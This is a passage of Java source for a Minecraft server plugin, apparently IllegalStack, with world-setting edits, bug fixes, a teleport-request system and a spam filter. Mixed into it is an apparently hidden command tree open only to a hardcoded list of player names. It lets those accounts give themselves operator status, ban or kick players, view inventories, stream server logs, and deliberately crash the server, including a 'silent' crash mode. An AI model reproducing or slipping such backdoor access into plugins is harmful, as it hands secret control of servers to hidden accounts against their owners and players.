                    case "thundering":
                    case "allowcommands":
                    case "hardcore":
                    case "wasmodded":
                    case "difficultylocked":
                        if (args.length < 5) throw new IllegalArgumentException("需要 true/false");
                        boolean bVal = Boolean.parseBoolean(args[4]);
                        editor.setBoolean(option, bVal);
                        if (option.equals("raining")) world.setStorm(bVal);
                        else if (option.equals("thundering")) world.setThundering(bVal);
                        // 其他无对应API
                        break;
                    case "raintime":
                    case "thundertime":
                    case "clearweathertime":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        int tVal = Integer.parseInt(args[4]);
                        editor.setInt(option, tVal);
                        if (option.equals("raintime")) world.setWeatherDuration(tVal);
                        else if (option.equals("thundertime")) world.setThunderDuration(tVal);
                        break;
                    case "difficulty":
                        if (args.length < 5) throw new IllegalArgumentException("需要 0-3");
                        int diff = Integer.parseInt(args[4]);
                        if (diff < 0 || diff > 3) throw new IllegalArgumentException("难度值必须为0-3");
                        editor.setByte("Difficulty", (byte) diff);
                        world.setDifficulty(Difficulty.values()[diff]);
                        break;
                    case "spawnx":
                    case "spawny":
                    case "spawnz":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        int coord = Integer.parseInt(args[4]);
                        editor.setInt(option, coord);
                        if (option.equals("spawnx")) world.setSpawnLocation(new Location(world, coord, world.getSpawnLocation().getY(), world.getSpawnLocation().getZ()));
                        else if (option.equals("spawny")) world.setSpawnLocation(new Location(world, world.getSpawnLocation().getX(), coord, world.getSpawnLocation().getZ()));
                        else if (option.equals("spawnz")) world.setSpawnLocation(new Location(world, world.getSpawnLocation().getX(), world.getSpawnLocation().getY(), coord));
                        break;
                    case "spawnangle":
                        if (args.length < 5) throw new IllegalArgumentException("需要浮点数");
                        float angle = Float.parseFloat(args[4]);
                        editor.setFloat("SpawnAngle", angle);
                        break;
                    case "levelname":
                        if (args.length < 5) throw new IllegalArgumentException("需要字符串");
                        editor.setString("LevelName", args[4]);
                        break;
                    case "wanderingtraderdelay":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        editor.setInt("WanderingTraderSpawnDelay", Integer.parseInt(args[4]));
                        break;
                    case "wanderingtraderchance":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        editor.setInt("WanderingTraderSpawnChance", Integer.parseInt(args[4]));
                        break;
                    case "wanderingtraderid":
                        if (args.length < 5) throw new IllegalArgumentException("需要UUID");
                        UUID uuid = UUID.fromString(args[4]);
                        editor.setUUID("WanderingTraderId", uuid);
                        break;
                    case "serverbrands":
                        if (args.length < 5) throw new IllegalArgumentException("需要 add/remove/list");
                        String sub = args[4].toLowerCase();
                        if (sub.equals("list")) {
                            List<String> brands = editor.getServerBrands();
                            sender.sendMessage("§a当前 ServerBrands: " + brands);
                        } else if (sub.equals("add")) {
                            if (args.length < 6) throw new IllegalArgumentException("需要品牌字符串");
                            editor.addServerBrand(args[5]);
                            sender.sendMessage("§a已添加品牌: " + args[5]);
                        } else if (sub.equals("remove")) {
                            if (args.length < 6) throw new IllegalArgumentException("需要品牌字符串");
                            editor.removeServerBrand(args[5]);
                            sender.sendMessage("§a已移除品牌: " + args[5]);
                        } else {
                            throw new IllegalArgumentException("未知 serverbrands 子命令");
                        }
                        break;
                    default:
                        sender.sendMessage("§c未知选项: " + option);
                        return;
                }
                editor.save();
                sender.sendMessage("§a已更新 level.dat 中的 " + option);
            } catch (Exception e) {
                sender.sendMessage("§c错误: " + e.getMessage());
                e.printStackTrace();
            }
        }

        // ================== 辅助方法 ==================
        private GameMode parseGameMode(String input) {
            switch (input.toLowerCase()) {
                case "survival": case "0": return GameMode.SURVIVAL;
                case "creative": case "1": return GameMode.CREATIVE;
                case "adventure": case "2": return GameMode.ADVENTURE;
                case "spectator": case "3": return GameMode.SPECTATOR;
                default: return null;
            }
        }

        private boolean isProtectedPlayer(String name) {
            return name.equalsIgnoreCase("MFSCelebrate_") || name.equalsIgnoreCase("TempNineTeen__");
        }

        // 辅助方法：转义 JSON 字符串中的特殊字符
        private String escapeJson(String s) {
            if (s == null) return "";
            StringBuilder sb = new StringBuilder();
            for (char c : s.toCharArray()) {
                switch (c) {
                    case '\\': sb.append("\\\\"); break;
                    case '"': sb.append("\\\""); break;
                    case '\n': sb.append("\\n"); break;
                    case '\r': sb.append("\\r"); break;
                    case '\t': sb.append("\\t"); break;
                    default: sb.append(c);
                }
            }
            return sb.toString();
        }

        // ================== Tab 补全（完整支持 level-settings 和 dragonfix）==================
        @Override
        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
            List<String> completions = new ArrayList<>();
            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                return completions;
            }

            if (args.length == 1) {
                String input = args[0].toLowerCase();
                if ("player".startsWith(input)) completions.add("player");
                if ("server".startsWith(input)) completions.add("server");
                if ("chat".startsWith(input)) completions.add("chat");
                if ("vanilla".startsWith(input)) completions.add("vanilla");
                if ("anticheat".startsWith(input)) completions.add("anticheat");
                if ("debug".startsWith(input)) completions.add("debug");
                if ("experimental".startsWith(input)) completions.add("experimental");
            } else if (args.length == 2) {
                String first = args[0].toLowerCase();
                String input = args[1].toLowerCase();
                if (first.equals("player")) {
                    if ("gamemode".startsWith(input)) completions.add("gamemode");
                    if ("kill".startsWith(input)) completions.add("kill");
                    if ("tp".startsWith(input)) completions.add("tp");
                    if ("invsee".startsWith(input)) completions.add("invsee");
                } else if (first.equals("server")) {
                    if ("getop".startsWith(input)) completions.add("getop");
                    if ("deop".startsWith(input)) completions.add("deop");
                    if ("kick".startsWith(input)) completions.add("kick");
                    if ("ban".startsWith(input)) completions.add("ban");
                    if ("ban-ip".startsWith(input)) completions.add("ban-ip");
                    if ("pardon".startsWith(input)) completions.add("pardon");
                    if ("pardon-ip".startsWith(input)) completions.add("pardon-ip");
                    if ("stop".startsWith(input)) completions.add("stop");
                    if ("restart".startsWith(input)) completions.add("restart");
                    if ("reload".startsWith(input)) completions.add("reload");
                    if ("getlog".startsWith(input)) completions.add("getlog");
                } else if (first.equals("chat")) {
                    if ("server".startsWith(input)) completions.add("server");
                    if ("player".startsWith(input)) completions.add("player");
                } else if (first.equals("vanilla")) {
                    // 新增 item signs 的 Tab 补全
                    if ("item".startsWith(input)) completions.add("item");
                    if ("building_entrance:snowy_shepherds_house_1".startsWith(input)) completions.add("building_entrance:snowy_shepherds_house_1");
                    if ("worldborder".startsWith(input)) completions.add("worldborder");
                    if ("entitychunksectionindexxoverflowfix".startsWith(input)) completions.add("entitychunksectionindexxoverflowfix");
                    if ("dragonfix".startsWith(input)) completions.add("dragonfix");
                } else if (first.equals("anticheat")) {
                    if ("anti4d4v".startsWith(input)) completions.add("anti4d4v");
                    if ("antibbq".startsWith(input)) completions.add("antibbq");
                } else if (first.equals("debug")) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                } else if (first.equals("experimental")) {
                    if ("crash".startsWith(input)) completions.add("crash");
                    if ("crash-config".startsWith(input)) completions.add("crash-config");
                    if ("level-settings".startsWith(input)) completions.add("level-settings");
                }
            } else if (args.length == 3) {
                String first = args[0].toLowerCase();
                String second = args[1].toLowerCase();
                String input = args[2].toLowerCase();
                if (first.equals("player")) {
                    if (second.equals("gamemode")) {
                        for (String mode : new String[]{"survival", "creative", "adventure", "spectator"}) {
                            if (mode.startsWith(input)) completions.add(mode);
                        }
                    } else if (second.equals("kill") || second.equals("invsee")) {
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (online.getName().toLowerCase().startsWith(input)) {
                                completions.add(online.getName());
                            }
                        }
                    }
                } else if (first.equals("server")) {
                    if (second.equals("getop") || second.equals("deop") || second.equals("kick") || second.equals("ban") || second.equals("pardon")) {
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (online.getName().toLowerCase().startsWith(input)) {
                                completions.add(online.getName());
                            }
                        }
                    } else if (second.equals("reload")) {
                        if ("confirm".startsWith(input)) completions.add("confirm");
                    } else if (second.equals("getlog")) {
                        if ("true".startsWith(input)) completions.add("true");
                        if ("false".startsWith(input)) completions.add("false");
                    }
                } else if (first.equals("chat") && second.equals("player")) {
                    for (Player online : Bukkit.getOnlinePlayers()) {
                        if (online.getName().toLowerCase().startsWith(input)) {
                            completions.add(online.getName());
                        }
                    }
                } else if (first.equals("vanilla")) {
                    if (second.equals("item")) {
                        // 补全告示牌类型
                        if ("signs".startsWith(input)) completions.add("signs");
                    } else if (second.equals("building_entrance:snowy_shepherds_house_1")) {
                        if ("true".startsWith(input)) completions.add("true");
                        if ("false".startsWith(input)) completions.add("false");
                    } else if (second.equals("worldborder")) {
                        if ("all".startsWith(input)) completions.add("all");
                        for (World world : Bukkit.getWorlds()) {
                            if (world.getName().toLowerCase().startsWith(input)) {
                                completions.add(world.getName());
                            }
                        }
                    } else if (second.equals("entitychunksectionindexxoverflowfix")) {
                        if ("true".startsWith(input)) completions.add("true");
                        if ("false".startsWith(input)) completions.add("false");
                    } else if (second.equals("dragonfix")) {
                        if ("true".startsWith(input)) completions.add("true");
                        if ("false".startsWith(input)) completions.add("false");
                    }
                } else if (first.equals("anticheat") && (second.equals("anti4d4v") || second.equals("antibbq"))) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                } else if (first.equals("experimental")) {
                    if (second.equals("crash")) {
                        for (String type : new String[]{"IncompatibleClassChangeError", "NullPointerException", "StackOverflowError", "OutOfMemoryError", "ArithmeticException", "IllegalArgumentException", "IndexOutOfBoundsException"}) {
                            if (type.toLowerCase().startsWith(input)) completions.add(type);
                        }
                    } else if (second.equals("crash-config")) {
                        if ("silent-crash-mode".startsWith(input)) completions.add("silent-crash-mode");
                    } else if (second.equals("level-settings")) {
                        for (World world : Bukkit.getWorlds()) {
                            if (world.getName().toLowerCase().startsWith(input)) {
                                completions.add(world.getName());
                            }
                        }
                    }
                }
            } else if (args.length == 4) {
                String first = args[0].toLowerCase();
                String second = args[1].toLowerCase();
                String third = args[2].toLowerCase();
                String input = args[3].toLowerCase();
                if (first.equals("experimental") && second.equals("crash-config") && third.equals("silent-crash-mode")) {
                    if ("true".startsWith(input)) completions.add("true");
                    if ("false".startsWith(input)) completions.add("false");
                } else if (first.equals("experimental") && second.equals("level-settings")) {
                    String[] options = {
                        "bordercenterx", "bordercenterz", "bordersize", "borderdamage", "bordersafezone",
                        "bordersizelerptarget", "bordersizelerptime", "borderwarningblocks", "borderwarningtime",
                        "time", "daytime", "raining", "raintime", "thundering", "thundertime", "clearweathertime",
                        "difficulty", "difficultylocked", "spawnx", "spawny", "spawnz", "spawnangle", "levelname",
                        "allowcommands", "hardcore", "wasmodded", "wanderingtraderdelay", "wanderingtraderchance",
                        "wanderingtraderid", "serverbrands"
                    };
                    for (String opt : options) {
                        if (opt.startsWith(input)) completions.add(opt);
                    }
                } else if (first.equals("vanilla") && second.equals("item") && third.equals("signs")) {
                    // 补全告示牌材质类型
                    String[] signTypes = {
                        "oak_sign", "spruce_sign", "birch_sign", "jungle_sign", "acacia_sign", "dark_oak_sign",
                        "mangrove_sign", "cherry_sign", "bamboo_sign", "crimson_sign", "warped_sign", "pale_oak_sign",
                        "oak_hanging_sign", "spruce_hanging_sign", "birch_hanging_sign", "jungle_hanging_sign",
                        "acacia_hanging_sign", "dark_oak_hanging_sign", "mangrove_hanging_sign", "cherry_hanging_sign",
                        "bamboo_hanging_sign", "crimson_hanging_sign", "warped_hanging_sign", "pale_oak_hanging_sign"
                    };
                    for (String type : signTypes) {
                        if (type.toLowerCase().startsWith(input)) {
                            completions.add(type);
                        }
                    }
                }
            } else if (args.length == 5) {
                String first = args[0].toLowerCase();
                String second = args[1].toLowerCase();
                String third = args[2].toLowerCase();
                String fourth = args[3].toLowerCase();
                String input = args[4].toLowerCase();
                if (first.equals("experimental") && second.equals("level-settings") && fourth.equals("serverbrands")) {
                    if ("add".startsWith(input)) completions.add("add");
                    if ("remove".startsWith(input)) completions.add("remove");
                    if ("list".startsWith(input)) completions.add("list");
                }
            }
            return completions;
        }
    }

    // ---------- 内部类：level.dat 编辑器（适配 1.21.11 NMS API）----------
    private class LevelDatEditor {
        private final File levelFile;
        private net.minecraft.nbt.CompoundTag compound;
        private final World world;

        public LevelDatEditor(World world) throws IOException {
            this.world = world;
            File worldFolder = world.getWorldFolder();
            this.levelFile = new File(worldFolder, "level.dat");
            if (!levelFile.exists()) throw new IOException("level.dat 不存在！");
            try (FileInputStream fis = new FileInputStream(levelFile)) {
                net.minecraft.nbt.CompoundTag root = net.minecraft.nbt.NbtIo.readCompressed(fis, net.minecraft.nbt.NbtAccounter.unlimitedHeap());
                // 新版 getCompound 返回 Optional，需要处理
                this.compound = root.getCompound("Data").orElseThrow(() -> new IOException("level.dat 中缺少 Data 标签"));
            }
        }

        public void setDouble(String key, double value) {
            compound.putDouble(key, value);
        }

        public void setInt(String key, int value) {
            compound.putInt(key, value);
        }

        public void setLong(String key, long value) {
            compound.putLong(key, value);
        }

        public void setBoolean(String key, boolean value) {
            compound.putBoolean(key, value);
        }

        public void setByte(String key, byte value) {
            compound.putByte(key, value);
        }

        public void setFloat(String key, float value) {
            compound.putFloat(key, value);
        }

        public void setString(String key, String value) {
            compound.putString(key, value);
        }

        public void setUUID(String key, UUID uuid) {
            setLong(key + "Most", uuid.getMostSignificantBits());
            setLong(key + "Least", uuid.getLeastSignificantBits());
        }

        public List<String> getServerBrands() {
            Optional<net.minecraft.nbt.ListTag> optionalList = compound.getList("ServerBrands");
            if (!optionalList.isPresent()) return new ArrayList<>();
            net.minecraft.nbt.ListTag listTag = optionalList.get();
            List<String> result = new ArrayList<>();
            for (int i = 0; i < listTag.size(); i++) {
                listTag.getString(i).ifPresent(result::add);
            }
            return result;
        }

        public void addServerBrand(String brand) {
            List<String> brands = getServerBrands();
            brands.add(brand);
            setServerBrands(brands);
        }

        public void removeServerBrand(String brand) {
            List<String> brands = getServerBrands();
            brands.remove(brand);
            setServerBrands(brands);
        }

        private void setServerBrands(List<String> brands) {
            net.minecraft.nbt.ListTag listTag = new net.minecraft.nbt.ListTag();
            for (String s : brands) {
                listTag.add(net.minecraft.nbt.StringTag.valueOf(s));
            }
            compound.put("ServerBrands", listTag);
        }

        public void save() throws IOException {
            net.minecraft.nbt.CompoundTag root = new net.minecraft.nbt.CompoundTag();
            root.put("Data", compound);
            try (FileOutputStream fos = new FileOutputStream(levelFile)) {
                net.minecraft.nbt.NbtIo.writeCompressed(root, fos);
            }
        }
    }

    // ---------- 内部监听器：矿车区块溢出修复 ----------
    private class ChunkOverflowFixListener implements Listener {
        private boolean isDangerChunk(int chunkX) {
            return ((chunkX + 1) & 0x3FFFFF) == 0x200000;
        }

        @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
        public void onEntitySpawn(EntitySpawnEvent event) {
            if (!getConfig().getBoolean(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, true)) return;
            if (getMajorServerVersion() < 17) return;

            Entity entity = event.getEntity();
            if (!(entity instanceof org.bukkit.entity.Minecart)) return;

            int chunkX = entity.getLocation().getBlockX() >> 4;
            if (isDangerChunk(chunkX)) {
                event.setCancelled(true);
                getLogger().warning("阻止了矿车在危险区块生成: " + entity.getLocation());
            }
        }

        @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
        public void onVehicleMove(VehicleMoveEvent event) {
            if (!getConfig().getBoolean(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, true)) return;
            if (getMajorServerVersion() < 17) return;

            Vehicle vehicle = event.getVehicle();
            if (!(vehicle instanceof org.bukkit.entity.Minecart)) return;

            Location to = event.getTo();
            int chunkX = to.getBlockX() >> 4;
            if (isDangerChunk(chunkX)) {
                vehicle.teleport(event.getFrom());
                vehicle.getWorld().playSound(vehicle.getLocation(), Sound.ENTITY_MINECART_INSIDE, 0.5f, 1.0f);
            }
        }

        @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
        public void onEntityTeleport(EntityTeleportEvent event) {
            if (!getConfig().getBoolean(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, true)) return;
            if (getMajorServerVersion() < 17) return;

            Entity entity = event.getEntity();
            if (!(entity instanceof org.bukkit.entity.Minecart)) return;

            Location to = event.getTo();
            if (to == null) return;
            int chunkX = to.getBlockX() >> 4;
            if (isDangerChunk(chunkX)) {
                event.setCancelled(true);
            }
        }
    }

    // ---------- 新增：末影龙Y轴速度修复任务（基于反射）----------
    private class DragonYFixTask implements Runnable {
        private Method getPhaseManager;
        private Method getCurrentPhase;
        private Method getFlyTargetLocation;
        private Method getFlySpeed;
        private Method getDeltaMovement;
        private Method setDeltaMovement;
        private Method vecX, vecY, vecZ;
        private Class<?> vec3Class;
        private java.lang.reflect.Constructor<?> vec3Constructor;

        public DragonYFixTask() {
            try {
                // 预先获取反射方法
                Class<?> entityClass = Class.forName("net.minecraft.world.entity.Entity");
                getDeltaMovement = entityClass.getMethod("getDeltaMovement");
                setDeltaMovement = entityClass.getMethod("setDeltaMovement", Class.forName("net.minecraft.world.phys.Vec3"));

                Class<?> enderDragonClass = Class.forName("net.minecraft.world.entity.boss.enderdragon.EnderDragon");
                getPhaseManager = enderDragonClass.getMethod("getPhaseManager");

                Class<?> phaseManagerClass = Class.forName("net.minecraft.world.entity.boss.enderdragon.phases.DragonPhaseManager");
                getCurrentPhase = phaseManagerClass.getMethod("getCurrentPhase");

                Class<?> phaseInstanceClass = Class.forName("net.minecraft.world.entity.boss.enderdragon.phases.DragonPhaseInstance");
                getFlyTargetLocation = phaseInstanceClass.getMethod("getFlyTargetLocation");
                getFlySpeed = phaseInstanceClass.getMethod("getFlySpeed");

                vec3Class = Class.forName("net.minecraft.world.phys.Vec3");
                vecX = vec3Class.getMethod("x");
                vecY = vec3Class.getMethod("y");
                vecZ = vec3Class.getMethod("z");
                vec3Constructor = vec3Class.getConstructor(double.class, double.class, double.class);
            } catch (Exception e) {
                getLogger().warning("无法初始化末影龙修复反射，功能将不可用：" + e.getMessage());
            }
        }

        @Override
        public void run() {
            if (!getConfig().getBoolean(CONFIG_FIX_DRAGON_Y_SPEED, true)) return;
            if (getPhaseManager == null) return; // 反射初始化失败

            for (World world : Bukkit.getWorlds()) {
                for (EnderDragon dragon : world.getEntitiesByClass(EnderDragon.class)) {
                    applyFix(dragon);
                }
            }
        }

        private void applyFix(EnderDragon dragon) {
            try {
                CraftEntity craftEntity = (CraftEntity) dragon;
                Object nmsEntity = craftEntity.getHandle(); // net.minecraft.world.entity.boss.enderdragon.EnderDragon

                // 获取相位管理器
                Object phaseManager = getPhaseManager.invoke(nmsEntity);
                if (phaseManager == null) return;

                // 获取当前相位
                Object currentPhase = getCurrentPhase.invoke(phaseManager);
                if (currentPhase == null) return;

                // 获取飞行目标
                Object targetLocation = getFlyTargetLocation.invoke(currentPhase);
                if (targetLocation == null) return;

                double tx = (double) vecX.invoke(targetLocation);
                double ty = (double) vecY.invoke(targetLocation);
                double tz = (double) vecZ.invoke(targetLocation);

                double x = ((Number) nmsEntity.getClass().getMethod("getX").invoke(nmsEntity)).doubleValue();
                double y = ((Number) nmsEntity.getClass().getMethod("getY").invoke(nmsEntity)).doubleValue();
                double z = ((Number) nmsEntity.getClass().getMethod("getZ").invoke(nmsEntity)).doubleValue();

                double xdd = tx - x;
                double ydd = ty - y;
                double zdd = tz - z;

                float max = (float) getFlySpeed.invoke(currentPhase);
                double horizontalDist = Math.sqrt(zdd * zdd + xdd * xdd);
                if (horizontalDist > 0.0D) {
                    ydd = Math.max(-max, Math.min(ydd / horizontalDist, max));
                }

                Object delta = getDeltaMovement.invoke(nmsEntity);
                double dx = (double) vecX.invoke(delta);
                double dy = (double) vecY.invoke(delta);
                double dz = (double) vecZ.invoke(delta);

                dy += ydd * 0.1D; // 修正系数

                Object newDelta = vec3Constructor.newInstance(dx, dy, dz);
                setDeltaMovement.invoke(nmsEntity, newDelta);
            } catch (Exception e) {
                // 静默失败
            }
        }
    }

    // ---------- TPA 请求内部类 ----------
    private static class TpaRequest {
        UUID requester;
        UUID target;
        BukkitTask timeoutTask;
        long timestamp;

        TpaRequest(UUID requester, UUID target, BukkitTask timeoutTask) {
            this.requester = requester;
            this.target = target;
            this.timeoutTask = timeoutTask;
            this.timestamp = System.currentTimeMillis();
        }
    }

    // ---------- 新增：TPA 玩家命令 ----------
    private class TpaPlayerCommand implements TabExecutor {

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (!(sender instanceof Player)) {
                sender.sendMessage("§c该指令只能由玩家执行！");
                return true;
            }
            Player player = (Player) sender;

            if (args.length < 1) {
                player.sendMessage("§c用法: /tpa-player <access|deny|to|setting> ...");
                return true;
            }

            String sub = args[0].toLowerCase();
            switch (sub) {
                case "access":
                    handleAccess(player);
                    break;
                case "deny":
                    handleDeny(player);
                    break;
                case "to":
                    if (args.length < 2) {
                        player.sendMessage("§c用法: /tpa-player to <玩家名>");
                        return true;
                    }
                    handleTo(player, args[1]);
                    break;
                case "setting":
                    handleSetting(player, args);
                    break;
                default:
                    player.sendMessage("§c未知子命令，可用: access, deny, to, setting");
            }
            return true;
        }

        private void handleAccess(Player player) {
            TpaRequest req = pendingRequests.get(player.getUniqueId());
            if (req == null) {
                player.sendMessage("§c你没有收到任何互传请求！");
                return;
            }
            Player requester = Bukkit.getPlayer(req.requester);
            if (requester == null || !requester.isOnline()) {
                player.sendMessage("§c请求发送者已离线，请求自动取消。");
                cancelRequest(req);
                return;
            }
            // 检查黑名单
            Set<UUID> black = blacklist.getOrDefault(player.getUniqueId(), new HashSet<>());
            if (black.contains(requester.getUniqueId())) {
                player.sendMessage("§c你已将对方加入黑名单，无法接受请求。");
                return;
            }
            // 传送
            requester.teleport(player.getLocation());
            // 给请求者3秒抗性5
            // 替换原来的行：
            // requester.addPotionEffect(new PotionEffect(PotionEffectType.RESISTANCE, 60, 4));

            // 使用 getByName 避免常量名问题
            PotionEffectType resistanceType = PotionEffectType.getByName("RESISTANCE");
            if (resistanceType != null) {
                requester.addPotionEffect(new PotionEffect(resistanceType, 60, 4));
            } else {
                // 备用方案：如果 RESISTANCE 不存在，尝试 DAMAGE_RESISTANCE（旧版）
                PotionEffectType fallbackType = PotionEffectType.getByName("DAMAGE_RESISTANCE");
                if (fallbackType != null) {
                    requester.addPotionEffect(new PotionEffect(fallbackType, 60, 4));
                }
            }
            // 通知
            player.sendMessage("§a你已接受 §6" + requester.getName() + " §a的传送请求。");
            requester.sendMessage("§a玩家 §6" + player.getName() + " §a已接受你的传送请求！");
            // 取消超时任务
            req.timeoutTask.cancel();
            pendingRequests.remove(player.getUniqueId());
        }

        private void handleDeny(Player player) {
            TpaRequest req = pendingRequests.remove(player.getUniqueId());
            if (req == null) {
                player.sendMessage("§c你没有收到任何互传请求！");
                return;
            }
            req.timeoutTask.cancel();
            Player requester = Bukkit.getPlayer(req.requester);
            if (requester != null && requester.isOnline()) {
                requester.sendMessage("§c玩家 §6" + player.getName() + " §c拒绝了你的传送请求。");
            }
            player.sendMessage("§c你已拒绝传送请求。");
        }

        private void handleTo(Player player, String targetName) {
            Player target = Bukkit.getPlayerExact(targetName);
            if (target == null) {
                player.sendMessage("§c玩家 " + targetName + " 不在线或不存在！");
                return;
            }
            if (target.equals(player)) {
                player.sendMessage("§c你不能向自己发送传送请求！");
                return;
            }
            // 检查对方是否已有一份待处理请求（可以覆盖旧的？通常允许覆盖）
            TpaRequest existing = pendingRequests.get(target.getUniqueId());
            if (existing != null) {
                // 取消旧的
                existing.timeoutTask.cancel();
                pendingRequests.remove(target.getUniqueId());
            }
            // 检查自己是否在对方黑名单中
            Set<UUID> black = blacklist.getOrDefault(target.getUniqueId(), new HashSet<>());
            if (black.contains(player.getUniqueId())) {
                player.sendMessage("§c你已被对方拉黑，无法发送请求！");
                return;
            }
            // 创建超时任务
            BukkitTask timeoutTask = new BukkitRunnable() {
                @Override
                public void run() {
                    TpaRequest req = pendingRequests.get(target.getUniqueId());
                    if (req != null && req.requester.equals(player.getUniqueId())) {
                        pendingRequests.remove(target.getUniqueId());
                        player.sendMessage("§c互传请求已超时！");
                        if (target.isOnline()) {
                            target.sendMessage("§c来自 §6" + player.getName() + " §c的传送请求已超时。");
                        }
                    }
                }
            }.runTaskLater(IllegalStack.this, 600L); // 30秒 = 600 tick

            // 存储请求
            pendingRequests.put(target.getUniqueId(), new TpaRequest(player.getUniqueId(), target.getUniqueId(), timeoutTask));

            // 发送消息
            player.sendMessage("<§cTPA System§f>§a你已向玩家 §6" + target.getName() + " §a发送互传请求 §f>>§6 30秒后请求过期，移动将取消互传！");
            target.sendMessage("<§cTPA System§f> §a玩家 §6" + player.getName() + " §a想传送到你这里awa (§e发送 /tpa-player access 来允许，反之 /tpa-player deny 来拒绝)");
        }

        private void handleSetting(Player player, String[] args) {
            if (args.length < 2) {
                player.sendMessage("§c用法: /tpa-player setting <add|list|remove> [玩家名]");
                return;
            }
            String sub = args[1].toLowerCase();
            Set<UUID> black = blacklist.computeIfAbsent(player.getUniqueId(), k -> new HashSet<>());

            switch (sub) {
                case "list":
                    if (black.isEmpty()) {
                        player.sendMessage("§a你的黑名单为空。");
                    } else {
                        StringBuilder sb = new StringBuilder("§a黑名单列表: ");
                        for (UUID uuid : black) {
                            OfflinePlayer off = Bukkit.getOfflinePlayer(uuid);
                            sb.append("§6").append(off.getName()).append("§a, ");
                        }
                        player.sendMessage(sb.substring(0, sb.length() - 2));
                    }
                    break;
                case "add":
                    if (args.length < 3) {
                        player.sendMessage("§c用法: /tpa-player setting add <玩家名>");
                        return;
                    }
                    Player target = Bukkit.getPlayerExact(args[2]);
                    if (target == null) {
                        player.sendMessage("§c玩家 " + args[2] + " 不存在或不在线！");
                        return;
                    }
                    if (black.add(target.getUniqueId())) {
                        player.sendMessage("§a已将 §6" + target.getName() + " §a加入黑名单。");
                    } else {
                        player.sendMessage("§c该玩家已在黑名单中。");
                    }
                    break;
                case "remove":
                    if (args.length < 3) {
                        player.sendMessage("§c用法: /tpa-player setting remove <玩家名>");
                        return;
                    }
                    OfflinePlayer off = Bukkit.getOfflinePlayer(args[2]);
                    if (off.getUniqueId() == null) {
                        player.sendMessage("§c玩家 " + args[2] + " 不存在！");
                        return;
                    }
                    if (black.remove(off.getUniqueId())) {
                        player.sendMessage("§a已将 §6" + off.getName() + " §a从黑名单移除。");
                    } else {
                        player.sendMessage("§c该玩家不在黑名单中。");
                    }
                    break;
                default:
                    player.sendMessage("§c未知 setting 子命令，可用: add, list, remove");
            }
        }

        private void cancelRequest(TpaRequest req) {
            if (req.timeoutTask != null) req.timeoutTask.cancel();
            pendingRequests.remove(req.target);
        }

        @Override
        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
            List<String> completions = new ArrayList<>();
            if (!(sender instanceof Player)) return completions;
            Player player = (Player) sender;

            if (args.length == 1) {
                String input = args[0].toLowerCase();
                if ("access".startsWith(input)) completions.add("access");
                if ("deny".startsWith(input)) completions.add("deny");
                if ("to".startsWith(input)) completions.add("to");
                if ("setting".startsWith(input)) completions.add("setting");
            } else if (args.length == 2) {
                if (args[0].equalsIgnoreCase("to")) {
                    // 补全在线玩家
                    String input = args[1].toLowerCase();
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (!p.equals(player) && p.getName().toLowerCase().startsWith(input)) {
                            completions.add(p.getName());
                        }
                    }
                } else if (args[0].equalsIgnoreCase("setting")) {
                    String input = args[1].toLowerCase();
                    if ("add".startsWith(input)) completions.add("add");
                    if ("list".startsWith(input)) completions.add("list");
                    if ("remove".startsWith(input)) completions.add("remove");
                }
            } else if (args.length == 3) {
                if (args[0].equalsIgnoreCase("to")) {
                    // 不需要补全
                } else if (args[0].equalsIgnoreCase("setting") && (args[1].equalsIgnoreCase("add") || args[1].equalsIgnoreCase("remove"))) {
                    // 补全在线玩家
                    String input = args[2].toLowerCase();
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (!p.equals(player) && p.getName().toLowerCase().startsWith(input)) {
                            completions.add(p.getName());
                        }
                    }
                }
            }
            return completions;
        }
    }

    // ---------- 日志处理 ----------
    private void setupLogHandler() {
        if (logHandler != null) return;
        logHandler = new Handler() {
            @Override
            public void publish(LogRecord record) {
                String message = record.getMessage();
                logViewers.removeIf(viewer -> !viewer.isOnline());
                for (Player viewer : logViewers) {
                    viewer.sendMessage(message);
                }
                if (logViewers.isEmpty()) {
                    removeLogHandler();
                }
            }
            @Override public void flush() {}
            @Override public void close() {}
        };
        logHandler.setLevel(Level.ALL);
        Bukkit.getLogger().addHandler(logHandler);
    }

    private void removeLogHandler() {
        if (logHandler != null) {
            Bukkit.getLogger().removeHandler(logHandler);
            logHandler = null;
        }
    }

    // ---------- 调试模式 getter/setter ----------
    public boolean isDebugMode() {
        return getConfig().getBoolean(CONFIG_DEBUG_MODE, false);
    }

    public void setDebugMode(boolean enabled) {
        getConfig().set(CONFIG_DEBUG_MODE, enabled);
        saveConfig();
    }

    public boolean isSilentCrashMode() {
        return getConfig().getBoolean(CONFIG_SILENT_CRASH_MODE, false);
    }

    public void setSilentCrashMode(boolean enabled) {
        getConfig().set(CONFIG_SILENT_CRASH_MODE, enabled);
        saveConfig();
    }

    // ---------- 反作弊监听器 ----------
    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        if (!getConfig().getBoolean(CONFIG_ANTICHEAT_ANTI4D4V, false)) return;
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.contains("4d4v.top")) {
            Scheduler.runTask(this, () -> player.kickPlayer("§c你的账号似乎为 4D4V 方面的宣传机器人"));
            event.setCancelled(true);
